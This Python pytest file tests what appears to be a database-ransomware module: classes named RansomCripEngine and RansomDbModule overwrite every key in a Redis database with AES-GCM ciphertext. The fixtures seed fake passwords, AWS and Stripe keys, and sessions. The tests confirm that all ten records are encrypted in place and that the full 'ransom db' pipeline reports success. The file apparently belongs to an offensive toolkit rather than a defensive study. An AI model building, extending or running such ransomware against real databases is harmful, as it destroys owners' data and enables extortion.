import os
import hashlib
import pytest

os.environ.setdefault("KEY_CRIP_DATA", "integration-test-key-2026")

from cryptography.hazmat.primitives.ciphers.aead import AESGCM

REDIS_URI = os.getenv("REDIS_TEST_URI", "redis://localhost:16379/0")
_NONCE_LEN = 12


def _can_connect_redis() -> bool:
    try:
        import redis
        r = redis.from_url(REDIS_URI, socket_timeout=3)
        r.ping()
        r.close()
        return True
    except Exception:
        return False


def _decrypt_hex(hex_str: str) -> bytes:
    blob = bytes.fromhex(hex_str)
    key_bytes = hashlib.sha256(os.getenv("KEY_CRIP_DATA", "").encode("utf-8")).digest()
    aesgcm = AESGCM(key_bytes)
    return aesgcm.decrypt(blob[:_NONCE_LEN], blob[_NONCE_LEN:], None)


skip_no_redis = pytest.mark.skipif(
    not _can_connect_redis(),
    reason="Redis não disponível em localhost:16379"
)


@skip_no_redis
class TestRansomRedis:

    @pytest.fixture(autouse=True)
    def setup_keys(self):
        import redis
        r = redis.from_url(REDIS_URI, socket_timeout=3)
        r.flushdb()

        r.set("user:alice:password", "secret123")
        r.set("user:bob:password", "hunter2")
        r.set("user:carol:password", "p@ssw0rd")
        r.set("api:stripe:key", "sk_live_XXXX")
        r.set("api:aws:access_key", "AKIA1234567890")
        r.set("api:aws:secret_key", "wJalrXUtnFEMI/K7MDENG")
        r.set("session:abc123", '{"user":"admin","role":"superuser"}')
        r.set("session:def456", '{"user":"alice","role":"viewer"}')
        r.set("config:db_url", "postgresql://admin:secret@prod:5432/app")
        r.set("config:jwt_secret", "super-secret-jwt-key-256bit")

        yield r

        r.flushdb()
        r.close()

    def test_redis_adapter_connects(self, setup_keys):
        from infra.adapters.nosql.RedisAdapter import RedisAdapter
        adapter = RedisAdapter(REDIS_URI)
        records = adapter.list_records()
        assert len(records) == 10

    def test_redis_records_have_key_value(self, setup_keys):
        from infra.adapters.nosql.RedisAdapter import RedisAdapter
        adapter = RedisAdapter(REDIS_URI)
        for r in adapter.list_records():
            assert "_key" in r
            assert "_value" in r

    def test_redis_encrypt_all_keys(self, setup_keys):
        from infra.adapters.nosql.RedisAdapter import RedisAdapter
        from infra.service.RansomCripEngine import RansomCripEngine

        adapter = RedisAdapter(REDIS_URI)
        engine  = RansomCripEngine()
        records = adapter.list_records()

        idx = [0]
        def write_fn(enc: bytes) -> None:
            adapter.overwrite(idx[0], enc)
            idx[0] += 1

        engine.execute(write_fn, records)
        assert idx[0] == 10

        import redis
        r = redis.from_url(REDIS_URI)
        for key in adapter._keys:
            val = r.get(key).decode("utf-8")
            assert len(val) > 40
            bytes.fromhex(val)
        r.close()

    def test_redis_encrypt_roundtrip(self, setup_keys):
        from infra.adapters.nosql.RedisAdapter import RedisAdapter
        from infra.service.RansomCripEngine import RansomCripEngine

        adapter = RedisAdapter(REDIS_URI)
        engine  = RansomCripEngine()
        records = adapter.list_records()

        alice_idx = None
        for i, r in enumerate(records):
            if r["_key"] == "user:alice:password":
                alice_idx = i
                break

        assert alice_idx is not None

        blobs = []
        engine.execute(lambda enc: blobs.append(enc), [records[alice_idx]])
        adapter.overwrite(alice_idx, blobs[0])

        import redis
        r = redis.from_url(REDIS_URI)
        enc_hex = r.get("user:alice:password").decode("utf-8")
        decrypted = _decrypt_hex(enc_hex)

        import json
        data = json.loads(decrypted)
        assert data["_key"] == "user:alice:password"
        assert data["_value"] == "secret123"
        r.close()

    def test_full_ransomdb_pipeline(self, setup_keys):
        from infra.modules.RansomDbModule import RansomDbModule
        module = RansomDbModule(broadcast=lambda _: None)
        count = module._run_nosql("Redis", REDIS_URI)
        assert count == 10

    @pytest.mark.asyncio
    async def test_full_handle_ransom_db(self, setup_keys):
        from infra.modules.RansomDbModule import RansomDbModule
        module = RansomDbModule(broadcast=lambda _: None)

        result = await module._handle_ransom_db({
            "db": "Redis",
            "mode": "single",
            "uri": REDIS_URI,
        })

        assert result.success is True
        assert result.data["encrypted"] == 10
        assert result.data["db"] == "Redis"

    def test_invalid_uri_fails(self):
        from infra.adapters.nosql.RedisAdapter import RedisAdapter
        with pytest.raises(Exception):
            RedisAdapter("redis://localhost:19999/0")
